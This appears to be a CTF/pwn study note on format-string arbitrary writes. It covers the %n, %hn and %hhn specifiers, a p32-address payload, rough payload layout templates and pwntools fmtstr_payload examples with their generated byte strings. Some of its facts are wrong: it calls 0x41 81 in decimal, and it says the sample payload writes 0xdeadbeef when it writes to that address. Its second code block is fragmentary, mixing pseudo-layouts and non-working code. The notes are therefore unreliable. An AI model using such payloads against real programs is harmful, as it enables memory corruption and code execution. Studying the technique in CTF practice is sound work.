---
layout: default
title: Format string
tags:
  - pwn
---
## Arbitrary Write

The `%n` format specifier writes the total number of bytes printed so far to the location you specified. 

This mean that to write `0x41` which is `81` in decimal, It means that 81 characters must be written before the `%n` placeholder in order to make it write `0x41` at the targeted location.

>Note that the `%n` specifier will write an int size data at the targeted location so it will write `0x00000041` instead of `0x41`
	use :
>	- `%hhn` to write a char size data (1 byte)  
>	- `%hn` to write a short size data (2 bytes)

```c
printf("Hello%n", &len);
printf("%d", len); // will print  5
```


writing to a location

```python
payload = p32(0xdeadbeef) + b"%3$n"
```

will write `0xdeadbeef` to offset 3


```python
[target_address][target_address+2]%



payload = b'%{int(printf_got)} %{offset}$n '

[ADDR_LOW][ADDR_HIGH][PADDING1][%<OFFSET>$hn][PADDING2][%<OFFSET+1>$hn]


[addr][addr + 2][padding(%<num>x)][%<offset>$hn][$<offset+1>$hn]


Examples:

>>> context.clear(arch = 'amd64')

>>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')

b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'

>>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')

b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'

>>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')

b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'

>>> context.clear(arch = 'i386')

>>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')

b'%322419390c%5$na\x00\x00\x00\x00'

>>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')

b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'

>>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')

b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'

>>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')

b'%1c%3$na\x00\x00\x00\x00'

>>> fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')

b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'

```